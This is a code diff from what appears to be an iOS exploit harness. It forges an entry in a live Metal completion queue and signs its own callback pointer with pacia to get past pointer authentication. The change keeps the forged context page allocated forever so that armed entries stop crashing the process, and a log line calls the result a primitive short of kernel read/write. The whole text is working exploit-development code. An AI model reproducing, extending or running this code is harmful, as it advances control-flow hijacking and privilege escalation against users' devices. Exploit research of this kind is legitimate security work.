@@ -345,27 +345,45 @@ static void p027_callback(void *ctx)
         p027_log(@"[0] qRef not heap, using stride=0x40");
     }
 
-    /* ── mmap context page at fixed address ── */
-    vm_address_t ctxAddr = P027_CTX_FIXED;
-    kern_return_t kr = vm_allocate(mach_task_self(), &ctxAddr,
-                                    P027_CTX_SIZE, VM_FLAGS_FIXED);
-    if (kr != KERN_SUCCESS || !ctxAddr) {
-        p027_log(@"[ctx] vm_allocate fixed=0x%llx failed kr=0x%x, trying anywhere",
-                  (unsigned long long)P027_CTX_FIXED, (unsigned)kr);
-        ctxAddr = 0;
-        kr = vm_allocate(mach_task_self(), &ctxAddr,
-                         P027_CTX_SIZE, VM_FLAGS_ANYWHERE);
-        if (kr != KERN_SUCCESS || !ctxAddr) {
-            p027_log(@"[ctx] STOP vm_allocate anywhere failed kr=0x%x",
-                      (unsigned)kr);
-            return [self finish:@"vm_allocate fail"];
+    /* ── mmap context page ── DOOR-NEVER-CLOSES (2026-11-20 crash fix) ──
+     * Receipts P007OpenOnly-2026-11-19-205413 / -211718: identical SIGSEGV
+     * (KERN_INVALID_ADDRESS at 0x10) on com.Metal.CompletionQueueDispatch
+     * ~30 s after the tap. The forged sel=25 entry stays armed in the LIVE
+     * Metal queue after this method returns; the old end-of-tap
+     * vm_deallocate freed the ctx page, so the framework dispatcher later
+     * dereferenced the dead context. Fix: the ctx page is allocated ONCE
+     * per process (fixed address first, then anywhere) and NEVER freed ──
+     * stale armed entries keep pointing at a live page forever. Each tap
+     * re-zeros and re-signs it. One page per process lifetime (leak law). */
+    static vm_address_t p027_ctx_pool = 0;
+    kern_return_t kr = KERN_SUCCESS;
+    if (p027_ctx_pool == 0) {
+        vm_address_t a = P027_CTX_FIXED;
+        kr = vm_allocate(mach_task_self(), &a, P027_CTX_SIZE, VM_FLAGS_FIXED);
+        if (kr != KERN_SUCCESS || !a) {
+            p027_log(@"[ctx] vm_allocate fixed=0x%llx failed kr=0x%x, trying anywhere",
+                      (unsigned long long)P027_CTX_FIXED, (unsigned)kr);
+            a = 0;
+            kr = vm_allocate(mach_task_self(), &a, P027_CTX_SIZE, VM_FLAGS_ANYWHERE);
+            if (kr != KERN_SUCCESS || !a) {
+                p027_log(@"[ctx] STOP vm_allocate anywhere failed kr=0x%x",
+                          (unsigned)kr);
+                return [self finish:@"vm_allocate fail"];
+            }
+            p027_log(@"[ctx] allocated anywhere at 0x%llx (fixed failed; POOLED, never freed)",
+                      (unsigned long long)a);
+        } else {
+            p027_log(@"[ctx] allocated fixed at 0x%llx (POOLED, never freed)",
+                      (unsigned long long)a);
         }
-        p027_log(@"[ctx] allocated anywhere at 0x%llx (fixed failed)",
-                  (unsigned long long)ctxAddr);
+        p027_ctx_pool = a;
     } else {
-        p027_log(@"[ctx] allocated fixed at 0x%llx", (unsigned long long)ctxAddr);
+        p027_log(@"[ctx] reusing pooled page 0x%llx (stale armed entries stay live)",
+                  (unsigned long long)p027_ctx_pool);
     }
+    vm_address_t ctxAddr = p027_ctx_pool;
     uint8_t *ctx = (uint8_t *)(uintptr_t)ctxAddr;
+    memset(ctx, 0, P027_CTX_SIZE);   /* re-zero: the previous tap's signature is stale */
 
     /* ── Self-sign our callback FP ──
      * context+0x10 = pacia(&p027_callback, ctx+0x10)
@@ -387,7 +405,8 @@ static void p027_callback(void *ctx)
     p027_log(@"[pac] pre-check: userspace blraa");
     if (!p027_pac_precheck(ctx, (uint64_t)ctxAddr)) {
         p027_log(@"[pac] FAILED — pacia signature invalid");
-        vm_deallocate(mach_task_self(), ctxAddr, P027_CTX_SIZE);
+        /* ctx pooled — never freed (stale entries from earlier taps may
+           still be armed in the live queue; freeing = the 205413 crash) */
         return [self finish:@"pac pre-check fail"];
     }
     p027_log(@"[pac] OK — blraa accepted our pacia");
@@ -466,7 +485,7 @@ static void p027_callback(void *ctx)
             p027_log(@"  3. +0x10 must be nonzero (context pointer)");
             p027_log(@"  4. +0x18 may need valid pointer (not 0)");
             p027_log(@"  5. qid must match queue (try qid from QueueGetID)");
-            vm_deallocate(mach_task_self(), ctxAddr, P027_CTX_SIZE);
+            /* ctx pooled ── never freed (door-never-closes) */
             return [self finish:@"submit fail"];
         }
     }
@@ -511,7 +530,7 @@ static void p027_callback(void *ctx)
     }
 
     p027_log(@"NOT KRW. Primitive proof only.");
-    vm_deallocate(mach_task_self(), ctxAddr, P027_CTX_SIZE);
+    p027_log(@"[ctx] page stays pooled + entries stay armed ── door-never-closes");
     return [self finish:@"ok"];
 }
 
